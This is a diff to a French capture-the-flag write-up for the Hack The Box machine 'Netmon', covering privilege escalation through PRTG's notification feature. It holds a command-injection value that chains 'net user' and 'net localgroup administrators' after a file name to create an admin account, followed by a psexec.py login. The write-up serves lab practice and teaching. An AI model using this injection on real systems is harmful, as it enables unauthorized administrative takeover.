@@ -173,7 +173,7 @@ Donc nous avons les informations d'identification nous pouvons nous connecter da
 
 Une fois connecté au service nous allons allez dans `Setup` et ensuite notifications. Créé une nouvelle notification et ensuite d'aller dans `Execute Program` pour justement exécuter des commandes. Je vais créé un utilisateur qui serais dans le groupe `administrators`.
 
-`test.txt;net user seyptoo 123 /add;net localgroup administrators seyptoo /add`
+`test.txt;net user anon p3nT3st! /add;net localgroup administrators anon /add`
 
 Vous devez mettre les informations dans la section `Parameter` et de mettre les informations pour créé notre utilisateur comme administrateur.
 
@@ -188,7 +188,7 @@ PrivEsc
 
 Une fois toute les modifications ont été effectué vous vous connectez avec `psexec.py` dans le système pour être administrateur. Vous pouvez également utilisé `smbclient`.
 
-    root@Seyptoo:~/htb/box/Netmon# 'seyptoo:123@10.10.10.152'
+    root@Seyptoo:~/htb/box/Netmon# psexec.py 'anon:p3nT3st!@10.10.10.152'
     Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
 
     [*] Requesting shares on 10.10.10.152.....
